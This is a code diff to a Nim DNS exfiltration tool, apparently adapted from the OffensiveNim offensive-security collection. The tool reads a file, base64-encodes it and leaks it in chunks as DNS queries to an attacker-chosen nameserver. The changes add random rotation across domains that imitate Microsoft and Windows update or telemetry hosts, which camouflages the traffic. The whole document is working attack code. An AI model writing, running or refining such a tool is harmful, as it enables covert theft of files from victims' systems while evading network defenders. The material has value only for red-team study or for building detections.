@@ -1,40 +1,35 @@
-import os, ndns, strutils
+import os, ndns, strutils, random
+from base64 import encode
+randomize()
 
 #[
 REF https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/dns_exfiltrate.nim
 
 TODO: 
     confirmar envio
-    rotacionar dominios
-
-domains = [".msn.windows.com", ".update.microsoft.com", ".client.wns.windows.com"]
 ]#
-
-if paramCount() < 3:
-    echo "[!] Use: dnx.exe <IP> <File> <Time between requests in ms>"
-    echo "[!] e.g: dnx.exe 127.0.0.1 arquivo.pdf 1000"
-    quit()
 
 proc dnsExfiltrate(ns: string, target: string, slp: int): void =
     let
         content = readFile(target)
-        hex = content.toHex
+        hex = encode(content.replace("=", ""), safe=true)
         header = initHeader(randId(), rd = true)
         client = initDnsClient(ns)
         chuckSize = 20 # max 62
+        domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".client.a.msn.windows.com", ".wnss.a.msn.microsoft.com"]
     
     var stringindex: int
 
-    echo "[+] Sending ", paramStr(2)
+    echo "[+] Sending ", target
 
     try:
         while stringindex <= hex.len-1:
             let 
                 query =  hex[stringindex .. (if stringindex + chuckSize - 1 > hex.len - 1: hex.len - 1 else: stringindex + chuckSize - 1)]
-                dnsquery = query & ".update.micrsoft.com"
+                dnsquery = query & sample(domains)
                 question = initQuestion(dnsquery, QType.A, QClass.IN)
                 msg = initMessage(header, @[question])
-            
+            #echo dnsquery
             discard(dnsAsyncQuery(client, msg))
 
             stringindex += chuckSize
@@ -51,4 +46,9 @@ proc dnsExfiltrate(ns: string, target: string, slp: int): void =
         echo "[!] Error: ", e.msg
 
 when isMainModule:
-    dnsExfiltrate(paramStr(1), paramStr(2), parseInt(paramStr(3)))
+    if paramCount() < 3:
+        echo "[!] Use: dnx.exe <IP> <File> <Time between requests in ms>"
+        echo "[!] e.g: dnx.exe 127.0.0.1 file.pdf 1000"
+        quit()
+    else:
+        dnsExfiltrate(paramStr(1), paramStr(2), parseInt(paramStr(3)))
